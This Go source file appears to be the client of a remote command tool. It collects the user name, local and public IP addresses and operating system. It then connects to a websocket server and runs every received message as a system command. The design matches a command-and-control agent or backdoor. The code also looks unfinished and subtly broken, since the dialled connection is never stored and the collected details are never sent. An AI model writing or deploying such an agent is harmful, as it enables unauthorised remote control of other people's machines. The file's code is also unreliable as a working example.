package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/coder/websocket"
)

var PingError error
var ReceiveError error

type Message struct {
	Message string `json:"message"`
}

func Serialize(data []byte) (message Message, err error) {
	err = json.Unmarshal(data, &message)
	return
}

type Client struct {
    Id				int
    SecretKey		string			`json:"SecretKey"`
    FriendlyName	string			`json:"FriendlyName"`
    ComputerName	string			`json:"ComputerName"`
    LocalIP			string			`json:"LocalIP"`
    PublicIP		string			`json:"PublicIP"`
    OS				string			`json:"OS"`
    Role			string
    Conn			*websocket.Conn
	CTX				context.Context
}

func (client *Client) Start() error {
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()

	conn, _, err := websocket.Dial(ctx, "ws://127.0.0.1:8080/ws/", nil)
	if err != nil { return err }
	defer conn.CloseNow()

	go client.Ping()
	client.Receive()
	if ReceiveError != nil { return ReceiveError }

	conn.Close(websocket.StatusNormalClosure, "")
	
	return nil
}

func (client *Client) Ping() {
	client.CTX = client.Conn.CloseRead(client.CTX)
	var err error
	for {
		err = client.Conn.Ping(client.CTX)
		if err != nil { PingError = err; return }
	}
}

func Execute(command string) (*bufio.Scanner, error) {
	command_args := strings.Split(command, " ")
	cmd := exec.Command(command_args[0], command_args[1:]...)

	stdout, err := cmd.StdoutPipe()
	if err != nil { return &bufio.Scanner{}, err }

	if err := cmd.Start(); err != nil { return &bufio.Scanner{}, err }

	scanner := bufio.NewScanner(stdout)

	if err := cmd.Wait(); err != nil { return scanner, err }

	return scanner, nil
}

func (client *Client) Receive() {
	for {
		if PingError != nil { ReceiveError = PingError; return }

		_, bytes, err := client.Conn.Read(client.CTX)
		if err != nil { ReceiveError = err; return }

		message, err := Serialize(bytes)
		if err != nil { ReceiveError = err; return }

		scanner, err := Execute(message.Message)
		if err != nil { ReceiveError = err; return }

		for scanner.Scan() {
			log.Print(scanner.Text())
		}
	}
}

func getSecretKey(n int) (string, error) {
	hasher := sha256.New()
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil { return "", err }

	hasher.Write(b)
	sha := hex.EncodeToString(hasher.Sum(nil))

	return sha, nil
}

func getComputerName() (string, error) {
	user, err := user.Current()
	if err != nil {
		return "", err
	}
	return user.Username, nil
}

func getLocalIP() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			return "", err
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ipv4 := ip.To4(); ipv4 != nil && !ip.IsLoopback() {
				return ipv4.String(), nil
			}
		}
	}
	
	return "", fmt.Errorf("локальный IP адрес не найден")
}

func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(ip), nil
}

func main() {
	secretKey, err    := getSecretKey(256)
	if err != nil { log.Fatal(err) }

	computerName, err := getComputerName()
	if err != nil { log.Fatal(err) }

	publicIP, err 	  := getPublicIP()
	if err != nil { log.Fatal(err) }

	localIP, err      := getLocalIP()
	if err != nil { log.Fatal(err) }

	os				  := runtime.GOOS
	
	client := Client{
		SecretKey: 		  secretKey,
		ComputerName:     computerName,
		LocalIP:		  localIP,
		PublicIP:		  publicIP,
		OS: 			  os,
	}

	client.Start()
}